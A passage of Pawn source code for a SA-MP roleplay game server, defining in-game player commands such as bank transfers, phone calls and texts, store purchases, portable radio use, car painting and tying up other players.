				PlayerInfo[playerid][pBank] -= amount;
				PlayerInfo[giveplayerid][pBank] += amount;
				format(string, sizeof(string), "   You have transferred $%d to %s's account.", amount, GetPlayerNameEx(giveplayerid),giveplayerid);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				format(string, sizeof(string), "   You have recieved $%d to into your account from %s.", amount, GetPlayerNameEx(playerid), playerid);
				SendClientMessage(giveplayerid, COLOR_GRAD1, string);
				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
				format(string, sizeof(string), "[BANK] %s (IP:%s) has transferred $%d to %s (IP:%s).", GetPlayerNameEx(playerid), ip, amount, GetPlayerNameEx(giveplayerid), ipex);

				if(amount >= 500000)
					ABroadCast(COLOR_YELLOW,string,2);

				Log("logs/pay.log", string);
				PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Invalid transaction amount.");
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

CMD:togpr(playerid, params[])
{
	if(PlayerInfo[playerid][pRadio] == 1)
	{
 		if(gRadio[playerid] == 0)
   		{
   		    new string[128];
     		gRadio[playerid] = 1;
       		format(string,sizeof(string),"You have switched your portable radio on, and it is now broadcasting at %d kHz.",PlayerInfo[playerid][pRadioFreq]);
	        SendClientMessage(playerid,COLOR_WHITE,string);
	    }
	    else
	    {
     		gRadio[playerid] = 0;
       		SendClientMessage(playerid,COLOR_WHITE,"You have switched off your portable radio.");
	    }
	}
	else
	{
 		SendClientMessage(playerid, COLOR_GRAD2, "You do not have a portable radio!");
	}
  	return 1;
}

CMD:buy(playerid, params[])
{
    if(!IsAt247(playerid))
	{
        SendClientMessage(playerid, COLOR_GRAD2, "   You're not in a 24-7!");
        return 1;
    }
 	ShowPlayerDialogEx(playerid, STOREMENU, DIALOG_STYLE_LIST, "24/7","Cell Phone		$50\nPhone Book		$25\nDice			$50\nCondom		$5\nCD Player		$5\nSpraycan		$20\nRope			$100\nCigar			$5\nSprunk			$1\nPortable Radio		$500\nCamera			$20", "Buy", "Cancel");
    return 1;
}

CMD:cellphonehelp(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    if(PlayerInfo[playerid][pNumber] != 0) {
        SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** - type a command for more infomation.");
        SendClientMessage(playerid, COLOR_GRAD3,"*** CELLPHONE *** /call 'eg: /call 911' /sms (/p)ickup (/h)angup /number /rt /speakerphone");
    } else SendClientMessage(playerid, COLOR_WHITE,"You can buy a cell phone in any 24-7");
    return 1;
}

CMD:call(playerid, params[])
{
	new string[128], phonenumb;

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /call [phonenumber]");

	phonenumb = strval(params);

	if(PlayerInfo[playerid][pJailTime] > 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"You can't use your phone while in jail.");
		return 1;
	}
	if(PlayerTied[playerid] != 0 || PlayerCuffed[playerid] != 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"You can't use your phone whilist restrained.");
		return 1;
	}
	if(PlayerInfo[playerid][pNumber] == 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You don't have a cell phone.");
		return 1;
	}
	if(PhoneOnline[playerid] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Your phone is off.");
		return 1;
	}
	format(string, sizeof(string), "* %s takes out a cellphone.", GetPlayerNameEx(playerid));
	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	if(phonenumb == 911)
	{
		if(PlayerInfo[playerid][pJailed] == 3 || PlayerInfo[playerid][pJailed] == 4)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Can't use this whilst prison!");
			return 1;
		}
		SendClientMessage(playerid, COLOR_WHITE, "HINT: You now use T to talk on your cellphone, type /hangup to hang up.");
		SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: Which service do you require, police or paramedic?");
		Mobile[playerid] = 911;
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
		SetPlayerAttachedObject(playerid, 9, 330, 6);
		return 1;
	}
	if(phonenumb == PlayerInfo[playerid][pNumber])
	{
		SendClientMessage(playerid, COLOR_GRAD2, "  You just get a busy tone...");
		return 1;
	}
	if(Mobile[playerid] != INVALID_PLAYER_ID)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're already in a call...");
		return 1;
	}
	foreach(Player, i)
	{
		if(PlayerInfo[i][pNumber] == phonenumb && phonenumb != 0)
		{
			new giveplayerid = i;
			Mobile[playerid] = giveplayerid; //caller connecting
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
					if(PhoneOnline[giveplayerid] > 0)
					{
						SendClientMessage(playerid, COLOR_GREY, "That player's phone is switched off.");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}
					if(Mobile[giveplayerid] != INVALID_PLAYER_ID)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You just get a busy tone...");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}
					if(Spectating[giveplayerid]!=0)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You just get a busy tone...");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}
					if(Mobile[giveplayerid] == INVALID_PLAYER_ID)
					{
						format(string, sizeof(string), "Your mobile is ringing - type /p to answer it. [Caller ID: %s]", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_YELLOW, string);
						format(string, sizeof(string), "* %s's phone begins to ring.", GetPlayerNameEx(i));
						SendClientMessage(playerid, COLOR_WHITE, "HINT: You now use T to talk on your cellphone, type /hangup to hang up.");
						ProxDetector(30.0, i, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						CellTime[playerid] = 1;
						SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
						SetPlayerAttachedObject(playerid, 9, 330, 6);
						return 1;
					}
				}
			}
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "Your call can't be completed as dialed, please check the number and try again.");
	return 1;
}

CMD:t(playerid, params[])
{
	return cmd_sms(playerid, params);
}

CMD:txt(playerid, params[])
{
	return cmd_sms(playerid, params);
}

CMD:rt(playerid, params[])
{
	new string[128], text[100];
	if(sscanf(params, "s[100]", text)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /rt [text chat]");

	if(gPlayerLogged[playerid] == 0)
		return SendClientMessage(playerid, COLOR_GREY, "   You haven't logged in yet!");

	if(GetPVarInt(playerid, "Injured") != 0||GetPVarInt(playerid, "Hospital")!=0)
		return SendClientMessage (playerid, COLOR_GRAD2, "You can't do this at this time.");

	if(PlayerTied[playerid] != 0 || PlayerCuffed[playerid] != 0)
		return SendClientMessage(playerid,COLOR_GREY,"You can't use your phone while you're restrained.");

	if(PlayerInfo[playerid][pNumber] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "  You don't have a cell phone...");

	if(PlayerInfo[playerid][pJailTime] > 0)
		return SendClientMessage(playerid,COLOR_GREY,"   You can't use your phone while in jail or prison!");


	if(PhoneOnline[playerid] > 0)
		return SendClientMessage(playerid, COLOR_GREY, "Your phone is off.");

	if(Spectating[playerid] == 0){
		format(string, sizeof(string), "* %s takes out a cellphone.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}

	if(LastSMS[playerid] == 555)
		return SendClientMessage(playerid, COLOR_GREY, "The number you have dialed has not been recognized.");

	foreach(Player, i) {
		if(PlayerInfo[i][pNumber] == LastSMS[playerid] && LastSMS[playerid] != 0) {
			new giveplayerid = i;
			Mobile[playerid] = giveplayerid; //caller connecting
			if(IsPlayerConnected(giveplayerid)) {
				if(PhoneOnline[giveplayerid] > 0 || PhonePrivacy[giveplayerid] > 0) {
					SendClientMessage(playerid, COLOR_GREY, "That player's phone is switched off.");
					Mobile[playerid] = INVALID_PLAYER_ID;
					return 1;
				}

				if(PhonePrivacy[playerid] == 1)
					format(string, sizeof(string), "SMS: %s, Sender: Unknown.", text, GetPlayerNameEx(playerid), PlayerInfo[playerid][pNumber]);
				else format(string, sizeof(string), "SMS: %s, Sender: %s (%d)", text, GetPlayerNameEx(playerid), PlayerInfo[playerid][pNumber]);

				LastSMS[playerid] = PlayerInfo[giveplayerid][pNumber];
				LastSMS[giveplayerid] = PlayerInfo[playerid][pNumber];
				SendClientMessage(giveplayerid, COLOR_YELLOW, string);
				SendClientMessage(playerid, COLOR_YELLOW, string);
				SendClientMessage(playerid, COLOR_WHITE, "Text message delivered.");
				format(string, sizeof(string), "~r~$-%d", txtcost);
				GameTextForPlayer(playerid, string, 5000, 1);
				GivePlayerCash(playerid,-txtcost);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				Mobile[playerid] = INVALID_PLAYER_ID;
				return 1;
			}
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "  Message delivery failed...");
	return 1;
}

CMD:sms(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "   You haven't logged in yet!");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") != 0||GetPVarInt(playerid, "Hospital")!=0)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "You can't do this at this time.");
		return 1;
	}
	if(PlayerTied[playerid] != 0 || PlayerCuffed[playerid] != 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"You can't use your phone while you're restrained.");
		return 1;
	}

	new string[128], phonenumb, text[100];
	if(sscanf(params, "ds[100]", phonenumb, text)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/t)ext [phonenumber] [text chat]");

	if(PlayerInfo[playerid][pNumber] == 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "  You don't have a cell phone...");
		return 1;
	}
	if(PlayerInfo[playerid][pJailTime] > 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"   You can't use your phone while in jail or prison!");
		return 1;
	}
	if(PhoneOnline[playerid] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Your phone is off.");
		return 1;
	}

	if(Spectating[playerid]==0)
	{
		format(string, sizeof(string), "* %s takes out a cellphone.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}

	if(phonenumb == 555)
	{
		SendClientMessage(playerid, COLOR_GREY, "The number you have dialed has not been recognized.");
		return 1;
	}

	foreach(Player, i)
	{
		if(PlayerInfo[i][pNumber] == phonenumb && phonenumb != 0)
		{
			new giveplayerid = i;
			Mobile[playerid] = giveplayerid; //caller connecting
			if(IsPlayerConnected(giveplayerid)) {
				if(giveplayerid != INVALID_PLAYER_ID) {
					if(PhoneOnline[giveplayerid] > 0) {
						SendClientMessage(playerid, COLOR_GREY, "That player's phone is switched off.");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}

					if(PhonePrivacy[playerid] == 1)
						format(string, sizeof(string), "SMS: %s, Sender: Unknown.", text,GetPlayerNameEx(playerid),PlayerInfo[playerid][pNumber]);
					else format(string, sizeof(string), "SMS: %s, Sender: %s (%d)", text,GetPlayerNameEx(playerid),PlayerInfo[playerid][pNumber]);

					LastSMS[playerid] = PlayerInfo[giveplayerid][pNumber];
					LastSMS[giveplayerid] = PlayerInfo[playerid][pNumber];
					SendClientMessage(giveplayerid, COLOR_YELLOW, string);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					SendClientMessage(playerid, COLOR_WHITE, "Text message delivered.");
					format(string, sizeof(string), "~r~$-%d", txtcost);
					GameTextForPlayer(playerid, string, 5000, 1);
					GivePlayerCash(playerid,-txtcost);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					Mobile[playerid] = INVALID_PLAYER_ID;
					return 1;
				}
			}
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "  Message delivery failed...");
	return 1;
}

CMD:p(playerid, params[])
{
	new string[128];
	if(Mobile[playerid] != INVALID_PLAYER_ID)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "  you're already on a call...");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "You can't do this at this time.");
		return 1;
	}
	foreach(Player, i)
	{
		if(Mobile[i] == playerid)
		{
			Mobile[playerid] = i; //caller connecting
			SendClientMessage(i,  COLOR_GRAD2, "   They picked up the call.");
			format(string, sizeof(string), "* %s answers their cellphone.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
			SetPlayerAttachedObject(playerid, 9, 330, 6);
		}
	}
	return 1;
}

CMD:h(playerid,params[])
{
	new string[128];

	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "You can't do this at this time.");
		return 1;
	}
	new caller = Mobile[playerid];
	if((IsPlayerConnected(caller) && caller != INVALID_PLAYER_ID)|| caller == 911 || caller == 912 || caller == 913 || caller == 914)
	{
		if(caller < 500)
		{
			SendClientMessage(caller,  COLOR_GRAD2, "   They hung up.");
			format(string, sizeof(string), "* %s puts away their cellphone.", GetPlayerNameEx(caller));
			ProxDetector(30.0, caller, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			CellTime[caller] = 0;
			Mobile[caller] = INVALID_PLAYER_ID;
		}
		CellTime[playerid] = 0;
		SendClientMessage(playerid,  COLOR_GRAD2, "   You hung up.");
		format(string, sizeof(string), "* %s puts away their cellphone.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		Mobile[playerid] = INVALID_PLAYER_ID;
		CellTime[playerid] = 0;
		SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
        RemovePlayerAttachedObject(caller, 9);
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
		RemovePlayerAttachedObject(playerid, 9);
		return 1;
	}
	SendClientMessage(playerid,  COLOR_GRAD2, "   Your phone is in your pocket.");
	return 1;
}

CMD:number(playerid, params[]) {
	if(PlayerInfo[playerid][pPhoneBook] == 1) {

		new
			iTarget;

		if(sscanf(params, "u", iTarget)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /number [playerid/partofname]");
		}
		else if(IsPlayerConnected(iTarget)) {
			new
				szNumber[16 + MAX_PLAYER_NAME];

			format(szNumber, sizeof(szNumber), "* %s (%i)", GetPlayerNameEx(iTarget), PlayerInfo[iTarget][pNumber]);
			SendClientMessage(playerid, COLOR_GRAD1, szNumber);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You don't have a phone book.");
	return 1;
}

CMD:dice(playerid, params[])
{
    new string[128];
    new dice = random(6)+1;
    if(PlayerInfo[playerid][pDice])
	{
        format(string, sizeof(string), "* %s rolls a dice that lands on %d.", GetPlayerNameEx(playerid),dice);
        ProxDetector(5.0, playerid, string, COLOR_NG,COLOR_NG,COLOR_NG,COLOR_NG,COLOR_NG);
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD2, "You don't have a dice.");
        return 1;
    }
    return 1;
}

CMD:music(playerid, params[])
{
	if(PlayerInfo[playerid][pCDPlayer])
	{
		new choice[32];
		if(sscanf(params, "s[32]", choice))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /music [name]");
			SendClientMessage(playerid, COLOR_GREY, "Available names: On, Off, Next");
			return 1;
		}

		if(strcmp(choice,"on",true) == 0)
		{
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~g~CD Player On", 5000, 5);
			new channel = Music[playerid];
			PlayerPlaySound(playerid, Songs[channel][0], 0.0, 0.0, 0.0);
		}
		else if(strcmp(choice,"off",true) == 0)
		{
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~r~CD Player Off", 5000, 5);
			PlayerFixRadio(playerid);
		}
		else if(strcmp(choice,"next",true) == 0)
		{
			if(Music[playerid] == 0) { Music[playerid] = 1; }
			else if(Music[playerid] == 1) { Music[playerid] = 2; }
			else if(Music[playerid] == 2) { Music[playerid] = 3; }
			else if(Music[playerid] == 3) { Music[playerid] = 4; }
			else if(Music[playerid] == 4) { Music[playerid] = 5; }
			else if(Music[playerid] == 5) { Music[playerid] = 6; }
			else if(Music[playerid] == 6) { Music[playerid] = 0; }
			new channel = Music[playerid];
			PlayerPlaySound(playerid, Songs[channel][0], 0.0, 0.0, 0.0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Unknown music command!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You don't have a CD-Player!");
		return 1;
	}
	return 1;
}

CMD:colorcar(playerid, params[]) {
	if(!IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GRAD2, "You're not in a vehicle.");

	if(PlayerInfo[playerid][pSpraycan] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "Your spraycan is empty.");

	if(GetPlayerVehicleSeat(playerid) != 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "You must be the driver to paint vehicles.");

	new
		iVeh = GetPlayerVehicleID(playerid);
	if(IsAnAmbulance(iVeh) || IsAFBICar(iVeh) || IsANewsVeh(iVeh))
		return SendClientMessage(playerid, COLOR_GREY, "You can't paint faction vehicles.");



	new
		iColors[2],
		iPlayerVeh;

	if(sscanf(params, "ii", iColors[0], iColors[1]))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /colorcar [ID 1] [ID 2]. Colors must be an ID.");

	if(!(0 <= iColors[0] <= 255 && 0 <= iColors[1] <= 255))
		return SendClientMessage(playerid, COLOR_GRAD2, "Invalid colour specified (IDs start at 0, and end at 255).");

	foreach(Player, i) {
		iPlayerVeh = GetPlayerVehicle(i, iVeh);
		if(iPlayerVeh != -1) {
			if(i == playerid) PlayerVehicleInfo[playerid][iPlayerVeh][pvColor1] = iColors[0], PlayerVehicleInfo[playerid][iPlayerVeh][pvColor2] = iColors[1];
			else return SendClientMessage(playerid,COLOR_GREY,"You can't spray other people's vehicles.");
		}
	}

	new
		szMessage[60];

	PlayerInfo[playerid][pSpraycan]--;
	format(szMessage, sizeof(szMessage), "You have changed the colors of your vehicle to ID %d, %d.", iColors[0], iColors[1]);
	SendClientMessage(playerid, COLOR_GRAD2, szMessage);
	return ChangeVehicleColor(iVeh, iColors[0], iColors[1]);
}

CMD:paintcar(playerid, params[]) {
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /paintcar [0-6] (3 to remove a paintjob)");

	if(!IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GRAD2, "You're not in a vehicle.");

	if(PlayerInfo[playerid][pSpraycan] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "Your spraycan is empty.");

	if(GetPlayerVehicleSeat(playerid) != 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "You must be the driver to paint vehicles.");

	new
		iVeh = GetPlayerVehicleID(playerid),
		iPaintID = strval(params),
		iPlayerVeh;

	if(IsAnAmbulance(iVeh) || IsACopCar(iVeh) || IsAFBICar(iVeh) || IsANewsVeh(iVeh))
		return SendClientMessage(playerid, COLOR_GREY, "You can't paint faction vehicles.");

	if(!(0 <= iPaintID <= 6)) {
		return SendClientMessage(playerid, COLOR_GRAD2, "The specified paint job ID must be between 0 and 6.");
	}
	foreach(Player, i) {
		iPlayerVeh = GetPlayerVehicle(i, iVeh);
		if(iPlayerVeh != -1) {
			if(i == playerid) PlayerVehicleInfo[playerid][iPlayerVeh][pvPaintJob] = iPaintID;
			else return SendClientMessage(playerid,COLOR_GREY,"You can't spray other people's vehicles.");
		}
	}

	ChangeVehiclePaintjob(iVeh, iPaintID);
	PlayerInfo[playerid][pSpraycan]--;
	return SendClientMessage(playerid, COLOR_GRAD2, "You have successfully applied this paint job to your vehicle.");
}

CMD:tie(playerid, params[])
{
	if(PlayerInfo[playerid][pRope] > 0)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /tie [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerTied[giveplayerid] > 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Player already Tied!");
				return 1;
			}
			if(PlayerCuffed[giveplayerid] != 0) return SendClientMessage(playerid, COLOR_GREY, "You can't tie a cuffed/tazed player.");
			if(PlayerInfo[giveplayerid][pJailed] >= 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "You can't tie a prisoned player.");
				return 1;
			}
			if(PlayerInfo[playerid][pRope] == 0)
			{
				SendClientMessage(playerid, COLOR_WHITE, "You don't have any rope left.");
			}
			else
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					new car = GetPlayerVehicleID(playerid);
					if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't tie up yourself!"); return 1; }
					if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && IsPlayerInVehicle(giveplayerid, car))
					{
						if(PlayerCuffed[giveplayerid] == 1 || PlayerCuffed[giveplayerid] == 2) {
							SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
							return 1;
						}

						format(string, sizeof(string), "* You were tied up by %s, till untie.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* You tied %s up, till untie.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s ties %s up, so he wont go anywhere.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						GameTextForPlayer(giveplayerid, "~r~Tied", 2500, 3);
						SetPVarInt(giveplayerid, "IsFrozen", 1);
						TogglePlayerControllable(giveplayerid, 0);
						PlayerTied[giveplayerid] = 1;
						PlayerInfo[playerid][pRope]--;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "   Player not in your Car, or you're not the Driver!");
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
					return 1;
				}
			}

		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You don't have a Rope!");
	}
	return 1;
}

CMD:untie(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /untie [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't Untie yourself!"); return 1; }
			if(PlayerCuffed[giveplayerid] != 0) return SendClientMessage(playerid, COLOR_GREY, "You can't untie a cuffed/tazed player.");
			if(PlayerTied[giveplayerid])
			{
				DeletePVar(giveplayerid, "IsFrozen");
				format(string, sizeof(string), "* You were untied by %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* You untied %s.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GameTextForPlayer(giveplayerid, "~g~Untied", 2500, 3);
				TogglePlayerControllable(giveplayerid, 1);
				PlayerTied[giveplayerid] = 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   That player isn't Tied up!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		return 1;
	}
	return 1;
}

CMD:usecigar(playerid, params[]) {
	if(PlayerInfo[playerid][pCigar] > 0) {
		if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

		new string[128];
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
		format(string, sizeof(string), "* %s takes out a cigar and lights it.", GetPlayerNameEx(playerid));
		ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		PlayerInfo[playerid][pCigar]--;
	}
	else SendClientMessage(playerid, COLOR_GREY, "You don't have any cigars, buy some from the 24/7!");

	return 1;
}

CMD:usesprunk(playerid, params[])
{
	if(PlayerInfo[playerid][pSprunk] > 0) {
		if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

		if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
			return SendClientMessage(playerid, COLOR_GRAD2, "You can't heal in the event!");

		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
			return SendClientMessage(playerid, COLOR_WHITE, "You must be on foot in order to drink sprunk.");

		if(IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, COLOR_WHITE, "You can't do this whilst in a vehicle.");

		if(GetPlayerState(playerid) == PLAYER_STATE_ENTER_VEHICLE_DRIVER || GetPlayerState(playerid) == PLAYER_STATE_ENTER_VEHICLE_PASSENGER || GetPlayerState(playerid) == PLAYER_STATE_EXIT_VEHICLE)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't do this whilst in a vehicle.");

		new string[128];
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
		format(string, sizeof(string), "* %s opens a can of sprunk.", GetPlayerNameEx(playerid));
		ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPVarInt(playerid, "UsingSprunk", 1);
		PlayerInfo[playerid][pSprunk]--;
		return 1;
	}
	else return SendClientMessage(playerid, COLOR_GREY, "You don't have any sprunk, buy some from the 24/7!");
}

CMD:pr(playerid, params[]) {
	if(PlayerInfo[playerid][pRadio] == 1) {
		if(isnull(params))
		    return SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /pr [chat message] (use /setfreq to set your radio frequency)");

		if(PlayerInfo[playerid][pRadioFreq] >= 1 || PlayerInfo[playerid][pRadioFreq] <= -1) {
			if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0 || PlayerInfo[playerid][pJailTime] > 0)
				return SendClientMessage (playerid, COLOR_GRAD2, "You can't do this at this time.");

			RadioBroadCast(playerid, params);
		} else SendClientMessage(playerid, COLOR_GRAD2, "The frequency of your radio is set to 0, you can't broadcast over that frequency.");
	} else SendClientMessage(playerid, COLOR_GRAD2, "You don't have a portable radio, you can buy one from a 24/7.");
	return 1;
}

CMD:setfreq(playerid, params[]) {
	new
		string[128],
		frequency;

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setfreq [frequency] ('0' will disable your portable radio)");

	frequency = strval(params);

	if(frequency > 9999999 || frequency < -9999999)
		return SendClientMessage(playerid, COLOR_GREY, "Frequency can't be lower than -9999999 or higher than 9999999!");

	if(PlayerInfo[playerid][pRadio] == 1) {
		PlayerInfo[playerid][pRadioFreq] = frequency;
		format(string, sizeof(string), "You have set the frequency of your portable radio to %d kHz.",frequency);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You don't have a portable radio, you can buy one from a 24/7.");
	return 1;
}

CMD:noooc(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(!noooc)
		{
			noooc = 1;
			SendClientMessageToAllEx(COLOR_GRAD2, "   OOC chat channel disabled by an Admin!");
		}
		else
		{
			noooc = 0;
			SendClientMessageToAllEx(COLOR_GRAD2, "   OOC chat channel enabled by an Admin!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:o(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not logged in.");
		return 1;
	}
	if((noooc) && PlayerInfo[playerid][pAdmin] < 1 && EventInfo[EventCreator] != playerid)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   The OOC channel has been disabled by an Admin!");
		return 1;
	}

	if(isnull(params))
